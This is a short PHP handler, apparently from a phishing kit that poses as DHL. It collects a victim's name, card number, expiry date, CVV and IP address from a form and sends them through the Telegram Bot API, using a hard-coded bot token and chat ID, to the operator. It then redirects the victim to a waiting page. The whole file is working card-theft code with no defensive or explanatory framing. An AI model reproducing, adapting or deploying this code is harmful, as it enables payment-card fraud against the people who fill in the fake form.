<?php
include('functions.php');
{
$message = '/-- DHL CARD INFOS --/' . get_client_ip() . "\r\n";
$message .= 'Full Name : ' . $_POST['fullname'] . "\r\n";
$message .= 'Card number : ' . $_POST['cardnumber'] . "\r\n";
$message .= 'Card Date : ' . $_POST['exp'] . "\r\n";
$message .= 'Card CVV : ' . $_POST['cvv'] . "\r\n";
$message .= '/-- END CARD INFOS --/' . "\r\n";
$message .= victim_infos();
$telegram_message .= 'Card number : ' . $_POST['cardnumber'] . "\r\n";
$telegram_message .= 'Card date : ' . $_POST['exp'] . "\r\n";
$telegram_message .= 'Card cvv : ' . $_POST['cvv'] . "\r\n";
$telegram_message .= 'IP address : ' . get_client_ip() . "\r\n";
telegram_send(urlencode($telegram_message));
$token = "6862310810:AAGOVMkN9t2lMdX7TYNULf2oIkQRuZGQpBY";
$data = [
    'text' => $message,
    'chat_id' => '6326018922'
];
}
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: waiting.html");
?>